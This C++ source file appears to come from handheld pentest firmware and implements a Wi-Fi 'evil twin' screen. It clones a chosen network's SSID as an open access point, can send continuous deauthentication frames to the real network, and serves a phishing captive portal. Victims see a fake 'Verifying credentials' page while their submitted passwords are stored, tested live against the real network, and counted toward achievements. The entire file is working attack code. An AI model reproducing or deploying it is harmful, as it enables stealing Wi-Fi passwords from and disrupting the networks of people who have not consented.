#include "WifiEvilTwinScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "utils/network/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// ── Destructor ──────────────────────────────────────────────────────────────

WifiEvilTwinScreen::~WifiEvilTwinScreen()
{
  _stopAttack();
}

// ── Callbacks ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_onVisit(void* ctx)
{
  auto* self = static_cast<WifiEvilTwinScreen*>(ctx);
  self->_log.addLine("[+] Portal visited");
}

void WifiEvilTwinScreen::_onPost(const String& data, void* ctx)
{
  auto* self = static_cast<WifiEvilTwinScreen*>(ctx);
  self->_pwdCount++;
  self->_log.addLine("[+] Credential received", TFT_GREEN);

  int nc = Achievement.inc("wifi_evil_twin_captured");
  if (nc == 1)  Achievement.unlock("wifi_evil_twin_captured");
  if (nc == 5)  Achievement.unlock("wifi_evil_twin_5");
  if (nc == 20) Achievement.unlock("wifi_evil_twin_20");
  if (nc == 50) Achievement.unlock("wifi_evil_twin_50");

  // Save captured data
  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X%02X%02X%02X%02X%02X",
           self->_target.bssid[0], self->_target.bssid[1], self->_target.bssid[2],
           self->_target.bssid[3], self->_target.bssid[4], self->_target.bssid[5]);
  String identifier = String(bssidStr) + "_" + self->_target.ssid;
  self->_portal.saveCaptured(data, identifier);

  // Check password if enabled
  String pwd;
  int nl = 0;
  int pos = 0;
  while (pos < (int)data.length()) {
    nl = data.indexOf('\n', pos);
    if (nl < 0) nl = data.length();
    String line = data.substring(pos, nl);
    if (line.startsWith("password=")) {
      pwd = line.substring(9);
      break;
    }
    pos = nl + 1;
  }

  if (self->_checkPwd && pwd.length() > 0) {
    char logBuf[60];
    snprintf(logBuf, sizeof(logBuf), "[+] Pwd: %s", pwd.c_str());
    self->_log.addLine(logBuf, TFT_GREEN);
    self->_pendingPwd = pwd;
    self->_pwdResult = 0;
  }
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::onInit()
{
  _showMenu();
}

void WifiEvilTwinScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MENU) {
    switch (index) {
      case 0: _selectWifi();    break;
      case 1:
        _deauth = !_deauth;
        _deauthSub = _deauth ? "On" : "Off";
        _menuItems[1].sublabel = _deauthSub.c_str();
        render();
        break;
      case 2:
        _checkPwd = !_checkPwd;
        _checkPwdSub = _checkPwd ? "On" : "Off";
        _menuItems[2].sublabel = _checkPwdSub.c_str();
        render();
        break;
      case 3: { // Portal
        _state = STATE_SELECT_PORTAL;
        if (_portal.selectPortal()) {
          _showMenu();
        } else {
          _state = STATE_MENU;
          render();
        }
        break;
      }
      case 4: { // File Manager toggle
        if (!_fmEnabled) {
          String indexPath = String(SharedWebServer::FM_PATH) + "/index.htm";
          if (!Uni.Storage || !Uni.Storage->exists(indexPath.c_str())) {
            ShowStatusAction::show("Web files not installed", 1500);
            render();
            break;
          }
        }
        _fmEnabled = !_fmEnabled;
        _fmSub = _fmEnabled ? "On" : "Off";
        _menuItems[4].sublabel = _fmSub.c_str();
        render();
        break;
      }
      case 5: _startAttack();   break;
    }
  } else if (_state == STATE_SELECT_WIFI && index < _scanCount) {
    _target.ssid    = WiFi.SSID(index);
    _target.channel = WiFi.channel(index);
    sscanf(_scanValues[index], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _showMenu();
  }
}

void WifiEvilTwinScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // Handle exit
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // DNS
  _portal.processDns();

  // Check queued password
  if (_pendingPwd.length() > 0) {
    String pwd = _pendingPwd;
    _pendingPwd = "";
    _tryPassword(pwd);
  }

  // Deauth
  if (_deauth && _attacker && millis() - _lastDeauth > 100) {
    _attacker->deauthenticate(_target.bssid, _target.channel);
    _lastDeauth = millis();
  }

  // Redraw
  if (millis() - _lastDraw > 500) {
    render();
    _lastDraw = millis();
  }
}

void WifiEvilTwinScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawLog(); return; }
  ListScreen::onRender();
}

void WifiEvilTwinScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI || _state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.goBack();
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_showMenu()
{
  _state = STATE_MENU;
  _networkSub  = _target.ssid;
  _deauthSub   = _deauth ? "On" : "Off";
  _checkPwdSub = _checkPwd ? "On" : "Off";
  _portalSub   = _portal.portalFolder().isEmpty() ? "-" : _portal.portalFolder();
  _fmSub       = _fmEnabled ? "On" : "Off";

  _menuItems[0] = {"Network",        _networkSub.c_str()};
  _menuItems[1] = {"Deauth",         _deauthSub.c_str()};
  _menuItems[2] = {"Check Password", _checkPwdSub.c_str()};
  _menuItems[3] = {"Portal",         _portalSub.c_str()};
  _menuItems[4] = {"File Manager",   _fmSub.c_str()};
  _menuItems[5] = {"Start"};
  setItems(_menuItems, 6);
}

// ── WiFi Scan ───────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_selectWifi()
{
  _state = STATE_SELECT_WIFI;
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  const int total = WiFi.scanNetworks();

  if (total == 0) {
    ShowStatusAction::show("No networks found");
    _showMenu();
    return;
  }

  _scanCount = total > MAX_SCAN ? MAX_SCAN : total;
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "[%2d] %s",
             WiFi.channel(i), WiFi.SSID(i).c_str());
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s",
             WiFi.BSSIDstr(i).c_str());
    _scanItems[i] = {_scanLabels[i], _scanValues[i]};
  }

  setItems(_scanItems, _scanCount);
}

// ── Try Password ────────────────────────────────────────────────────────────

bool WifiEvilTwinScreen::_tryPassword(const String& password)
{
  _log.addLine("[*] Checking password...");

  WiFi.begin(_target.ssid.c_str(), password.c_str());

  unsigned long start = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
    delay(100);
  }

  bool ok = WiFi.status() == WL_CONNECTED;
  WiFi.disconnect(false);

  if (ok) {
    _pwdResult = 1;
    _log.addLine("[+] Password correct!", TFT_GREEN);
  } else {
    _pwdResult = -1;
    _log.addLine("[!] Password wrong", TFT_RED);
  }

  return ok;
}

// ── Start / Stop Attack ─────────────────────────────────────────────────────

void WifiEvilTwinScreen::_startAttack()
{
  const MacAddr blank = {0, 0, 0, 0, 0, 0};
  if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
    ShowStatusAction::show("Select a network first!");
    return;
  }
  if (_portal.portalFolder().isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }

  int ne = Achievement.inc("wifi_evil_twin_started");
  if (ne == 1) Achievement.unlock("wifi_evil_twin_started");

  _state     = STATE_RUNNING;
  _log.clear();
  _pwdCount  = 0;
  _lastDraw  = 0;
  _lastDeauth = 0;

  _portal.setCallbacks(_onVisit, _onPost, this);
  _portal.loadPortalHtml();

  if (_portal.portalHtml().isEmpty()) {
    ShowStatusAction::show("Portal HTML not found!");
    _state = STATE_MENU;
    return;
  }

  // Init attacker without its own AP
  if (_deauth) {
    _attacker = new WifiAttackUtil(false);
    _log.addLine("Deauth enabled");
  } else {
    WiFi.mode(WIFI_AP_STA);
  }

  // Create soft AP cloning the target SSID
  WiFi.softAP(_target.ssid.c_str(), NULL, _target.channel, 0, 4);
  delay(100);
  IPAddress apIP = WiFi.softAPIP();

  _log.addLine("AP started");

  // Start file manager if enabled
  if (_fmEnabled) {
    if (!Uni.Server.enableFileManager()) {
      _fmEnabled = false;
      _log.addLine("[!] File Manager failed", TFT_RED);
    }
  }

  // Start captive portal server
  AsyncWebServer* server = _portal.start(apIP);

  // Override POST handler for password checking
  if (_checkPwd) {
    server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
      String data;
      String pwd;
      for (int i = 0; i < (int)req->params(); i++) {
        const AsyncWebParameter* p = req->getParam(i);
        if (!p->isPost()) continue;
        if (data.length() > 0) data += "\n";
        data += p->name() + "=" + p->value();
        if (p->name() == "password") pwd = p->value();
      }
      _onPost(data, this);

      if (pwd.length() > 0) {
        req->send(200, "text/html",
          "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
          "<style>body{font-family:sans-serif;text-align:center;margin:40px auto;max-width:350px}"
          ".dots::after{content:'';animation:d 1.5s steps(4) infinite}"
          "@keyframes d{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}}"
          "</style></head><body>"
          "<h2>Connecting<span class=\"dots\"></span></h2>"
          "<p id=\"msg\">Verifying credentials...</p>"
          "<script>"
          "setInterval(function(){"
          "fetch('/status').then(r=>r.text()).then(s=>{"
          "if(s==='ok'){document.getElementById('msg').textContent='Connected!';setTimeout(()=>location='/',2000)}"
          "else if(s==='fail'){document.getElementById('msg').textContent='Incorrect password';setTimeout(()=>location='/',2000)}"
          "})},2000);"
          "</script></body></html>");
      } else {
        req->send(200, "text/html", _portal.successHtml());
      }
    });

    server->on("/status", HTTP_GET, [this](AsyncWebServerRequest* req) {
      if (_pwdResult == 1)       req->send(200, "text/plain", "ok");
      else if (_pwdResult == -1) req->send(200, "text/plain", "fail");
      else                       req->send(200, "text/plain", "pending");
    });
  }

  // Captives index
  server->on("/captives", HTTP_GET, [](AsyncWebServerRequest* req) {
    if (!Uni.Storage || !Uni.Storage->isAvailable()) {
      req->send(200, "text/html", "<html><body><h3>No storage</h3></body></html>");
      return;
    }
    IStorage::DirEntry entries[20];
    uint8_t count = Uni.Storage->listDir("/unigeek/wifi/captives", entries, 20);
    String html = "<html><head><meta name=\"viewport\" content=\"width=device-width\">"
                  "<style>body{font-family:sans-serif;margin:20px}a{display:block;padding:6px 0}</style>"
                  "</head><body><h3>Captured Credentials</h3>";
    int found = 0;
    for (int i = 0; i < count; i++) {
      if (entries[i].isDir) continue;
      html += "<a href=\"/captives/" + String(entries[i].name) + "\">" + String(entries[i].name) + "</a>";
      found++;
    }
    if (found == 0) html += "<p>No captures yet.</p>";
    html += "</body></html>";
    req->send(200, "text/html", html);
  });

  if (Uni.Storage && Uni.Storage->isAvailable()) {
    server->serveStatic("/captives/", Uni.Storage->getFS(), "/unigeek/wifi/captives/");
  }

  _log.addLine("Web server started");
  _log.addLine("BACK/Press to stop");
  _drawLog();
}

void WifiEvilTwinScreen::_stopAttack()
{
  if (_fmEnabled) {
    Uni.Server.disableFileManager();
  }
  _portal.reset();
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _log.clear();
  _pwdCount    = 0;
  _lastDeauth  = 0;
  _lastDraw    = 0;
  _pendingPwd  = "";
  _pwdResult   = 0;
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiEvilTwinScreen::_drawLog()
{
  auto* self = this;
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](Sprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<WifiEvilTwinScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char pwdLabel[16];
      snprintf(pwdLabel, sizeof(pwdLabel), "Pwd: %d", s->_pwdCount);
      sp.drawString(pwdLabel, 2, barY);
      sp.setTextDatum(TR_DATUM);
      sp.drawString(s->_target.ssid.substring(0, 16), w - 2, barY);
    }, self);
}
